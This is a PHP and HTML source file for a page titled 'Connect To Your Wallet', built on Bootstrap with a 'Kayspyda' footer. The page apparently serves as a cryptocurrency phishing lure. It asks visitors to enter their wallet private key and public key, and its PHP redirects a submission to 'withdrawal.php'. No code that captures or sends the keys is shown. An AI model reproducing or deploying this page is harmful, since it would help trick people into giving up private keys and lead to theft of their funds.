<?php if(isset ($_POST['connect'])){
	
	
	header ('Location:withdrawal.php');
}

?>


<link href="//netdna.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//netdna.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js"></script>
<script src="//code.jquery.com/jquery-1.11.1.min.js"></script>
<link href="kayaccess.css" rel="stylesheet" id="bootstrap-css">
<!------ Include the above in your HEAD tag ---------->

<section id="login">
    <div class="container">
    	<div class="row">
    	    <div class="col-xs-12">
        	    <div class="form-wrap">
                <h1>Connect To Your Wallet </h1>
                    <form role="form" action="javascript:;" method="post" id="login-form" autocomplete="off">
                        <div class="form-group">
                            <label for="email" >Private Key</label>
                            <input type="text" name="email" id="email" class="form-control" placeholder="qnwnams**********">
                        </div>
                        <div class="form-group">
                            <label for="key" >Public Key</label>
                            <input type="password" name="key" id="key" class="form-control" placeholder="aska**************">
                        </div>
                        <div class="checkbox">
                            <span class="character-checkbox" onclick="showPassword()"></span>
                            <span class="label">Show password</span>
                        </div>
                        <button type="submit" id="btn-login" class="btn btn-custom btn-lg btn-block" >Connect </button>
                    </form>
                    <a href="javascript:;" class="forget" data-toggle="modal" data-target=".forget-modal">Forgot your password?</a>
                    <hr>
        	    </div>
    		</div> <!-- /.col-xs-12 -->
    	</div> <!-- /.row -->
    </div> <!-- /.container -->
</section>

 <!-- /.modal -->

<footer id="footer">
    <div class="container">
        <div class="row">
            <div class="col-xs-12">
                <p>Page © - 2018</p>
                <p>Powered by <strong><a href="" target="_blank">Kayspyda</a></strong></p>
            </div>
        </div>
    </div>
</footer>